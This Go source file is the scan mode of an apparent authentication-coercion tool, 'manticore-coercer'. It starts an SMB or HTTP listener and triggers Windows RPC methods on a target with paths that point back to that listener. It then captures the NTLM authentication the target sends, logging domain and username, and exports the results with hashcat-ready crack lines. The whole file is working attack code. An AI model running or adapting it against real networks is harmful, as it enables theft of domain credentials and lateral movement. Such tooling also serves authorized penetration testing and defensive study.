package mode_scan

import (
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/windows/credentials"

	"github.com/TheManticoreProject/manticore-coercer/filter"
	"github.com/TheManticoreProject/manticore-coercer/listener"
	"github.com/TheManticoreProject/manticore-coercer/methods"
	"github.com/TheManticoreProject/manticore-coercer/modes/common"
	"github.com/TheManticoreProject/manticore-coercer/results"
)

const authWaitTimeout = 2 * time.Second

type Options struct {
	Target    string
	AuthType  string
	StopFirst bool

	ListenerInterface string
	ListenerIP        string

	Domain   string
	Username string
	Password string
	Hashes   string

	SMBPort  int
	DCEPort  int
	HTTPPort int

	Filter     filter.Filter
	Delay      time.Duration
	ExportJSON string
	ExportXLSX string
	Timeout    time.Duration
	PathIP     string
}

func Run(opts Options) []results.MethodResult {
	listenIP, err := common.ResolveListenIP(opts.ListenerInterface, opts.ListenerIP)
	if err != nil {
		logger.Warn(fmt.Sprintf("Cannot resolve listener address: %s", err))
		return nil
	}

	smbListenPort := 445
	httpListenPort := opts.HTTPPort
	if httpListenPort == 0 {
		httpListenPort = 80
	}

	var lis listener.Listener
	switch opts.AuthType {
	case "http":
		lis = listener.NewHTTPListener(listenIP, httpListenPort)
	default:
		smbLis, err := listener.NewSMBListener(listenIP, smbListenPort)
		if err != nil {
			logger.Warn(fmt.Sprintf("Cannot create SMB listener: %s", err))
			return nil
		}
		lis = smbLis
	}

	if err := lis.Start(); err != nil {
		logger.Warn(fmt.Sprintf("Cannot start listener: %s", err))
		return nil
	}
	defer lis.Stop()

	logger.Info(fmt.Sprintf("  Listener started on %s (type: %s)", listenIP, opts.AuthType))

	registry := methods.DefaultRegistry()
	vars := methods.TemplateVars{
		ListenerIP: common.EffectivePathIP(opts.PathIP, listenIP),
		SMBPort:    smbListenPort,
		HTTPPort:   httpListenPort,
	}

	creds, err := credentials.NewCredentials(opts.Domain, opts.Username, opts.Password, opts.Hashes)
	if err != nil {
		logger.Warn(fmt.Sprintf("Invalid credentials: %s", err))
		return nil
	}

	connOpts := common.ConnectOpts{
		Target:  opts.Target,
		SMBPort: opts.SMBPort,
		DCEPort: opts.DCEPort,
		Timeout: opts.Timeout,
	}

	var allResults []results.MethodResult
	stopped := false

	for _, m := range registry.All() {
		if stopped {
			break
		}
		if !opts.Filter.MatchMethod(m) {
			continue
		}

		for _, access := range m.Access {
			if stopped {
				break
			}
			if !opts.Filter.MatchAccess(access) {
				continue
			}

			for _, ep := range m.ExploitPaths {
				if stopped {
					break
				}

				if opts.AuthType == "http" && ep.AuthType != methods.AuthHTTP {
					continue
				}
				if opts.AuthType != "http" && ep.AuthType != methods.AuthSMB {
					continue
				}

				exploitPath := methods.RenderPath(ep.Template, vars)
				logger.Info(fmt.Sprintf("    %s", m.FormatCall(exploitPath)))

				trigger := common.TryTrigger(connOpts, m, access, exploitPath, creds)
				outcome := results.ClassifyOutcome(trigger)

				mr := results.MethodResult{
					Target:      opts.Target,
					Transport:   access.Transport.String(),
					Pipe:        access.Pipe,
					Protocol:    m.Protocol,
					Function:    m.Function,
					Opnum:       m.Opnum,
					ExploitPath: exploitPath,
					Trigger:     trigger,
					Outcome:     outcome,
				}

				printTriggerResult(mr)

				if outcome == results.OutcomeSuccess || outcome == results.OutcomePathResolved {
					auth := waitForAuth(lis, authWaitTimeout)
					if auth != nil {
						mr.Auth = auth
						logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m Auth captured: %s\\%s (NTLMv%d) from %s",
							auth.Domain, auth.Username, auth.NTLMVersion, auth.FromAddr))
						if opts.StopFirst {
							stopped = true
						}
					} else {
						logger.Info("      \x1b[90m[-]\x1b[0m No auth received")
					}
				}

				allResults = append(allResults, mr)

				if opts.Delay > 0 {
					time.Sleep(opts.Delay)
				}
			}
		}
	}

	drainRemaining(lis, &allResults)

	if opts.ExportJSON != "" {
		exportJSON(opts.ExportJSON, allResults)
	}
	if opts.ExportXLSX != "" {
		if err := results.ExportMethodsXLSX(opts.ExportXLSX, allResults); err != nil {
			logger.Warn(fmt.Sprintf("Cannot write XLSX export: %s", err))
		} else {
			logger.Info(fmt.Sprintf("  Results exported to %s", opts.ExportXLSX))
		}
	}

	return allResults
}

func waitForAuth(lis listener.Listener, timeout time.Duration) *results.AuthResult {
	select {
	case ar, ok := <-lis.Results():
		if ok {
			return &ar
		}
		return nil
	case <-time.After(timeout):
		return nil
	}
}

func drainRemaining(lis listener.Listener, allResults *[]results.MethodResult) {
	for {
		select {
		case ar, ok := <-lis.Results():
			if !ok {
				return
			}
			logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m Late auth: %s\\%s (NTLMv%d) from %s",
				ar.Domain, ar.Username, ar.NTLMVersion, ar.FromAddr))
		case <-time.After(500 * time.Millisecond):
			return
		}
	}
}

func printTriggerResult(mr results.MethodResult) {
	status := mr.Trigger
	outcome := mr.Outcome

	switch outcome {
	case results.OutcomePathResolved:
		logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeSuccess:
		logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeAccessDenied:
		logger.Info(fmt.Sprintf("      \x1b[93m[!]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeFaulted:
		if status.Err != nil {
			logger.Info(fmt.Sprintf("      \x1b[91m[-]\x1b[0m %s: %s", outcome, status.Err))
		} else {
			logger.Info(fmt.Sprintf("      \x1b[91m[-]\x1b[0m %s", outcome))
		}
	case results.OutcomeNotAvailable:
		logger.Debug(fmt.Sprintf("      \x1b[90m[-]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	default:
		logger.Info(fmt.Sprintf("      \x1b[90m[?]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	}
}

type jsonExport struct {
	Target  string             `json:"target"`
	Results []jsonMethodResult `json:"results"`
}

type jsonMethodResult struct {
	Protocol    string    `json:"protocol"`
	Function    string    `json:"function"`
	Opnum       uint16    `json:"opnum"`
	Transport   string    `json:"transport"`
	Pipe        string    `json:"pipe,omitempty"`
	ExploitPath string    `json:"exploit_path"`
	Outcome     string    `json:"outcome"`
	Status      uint32    `json:"status"`
	Auth        *jsonAuth `json:"auth,omitempty"`
}

type jsonAuth struct {
	FromAddr    string `json:"from_addr"`
	Domain      string `json:"domain"`
	Username    string `json:"username"`
	NTLMVersion int    `json:"ntlm_version"`
	HashcatMode int    `json:"hashcat_mode"`
	HashcatLine string `json:"hashcat_line,omitempty"`
}

func exportJSON(path string, allResults []results.MethodResult) {
	target := ""
	if len(allResults) > 0 {
		target = allResults[0].Target
	}

	export := jsonExport{Target: target}
	for _, mr := range allResults {
		jr := jsonMethodResult{
			Protocol:    mr.Protocol,
			Function:    mr.Function,
			Opnum:       mr.Opnum,
			Transport:   mr.Transport,
			Pipe:        mr.Pipe,
			ExploitPath: mr.ExploitPath,
			Outcome:     mr.Outcome.String(),
			Status:      mr.Trigger.Status,
		}
		if mr.Auth != nil {
			jr.Auth = &jsonAuth{
				FromAddr:    mr.Auth.FromAddr,
				Domain:      mr.Auth.Domain,
				Username:    mr.Auth.Username,
				NTLMVersion: mr.Auth.NTLMVersion,
				HashcatMode: mr.Auth.HashcatMode,
				HashcatLine: mr.Auth.HashcatLine,
			}
		}
		export.Results = append(export.Results, jr)
	}

	data, err := json.MarshalIndent(export, "", "  ")
	if err != nil {
		logger.Warn(fmt.Sprintf("JSON export failed: %s", err))
		return
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		logger.Warn(fmt.Sprintf("Cannot write JSON export: %s", err))
		return
	}
	logger.Info(fmt.Sprintf("  Results exported to %s", path))
}
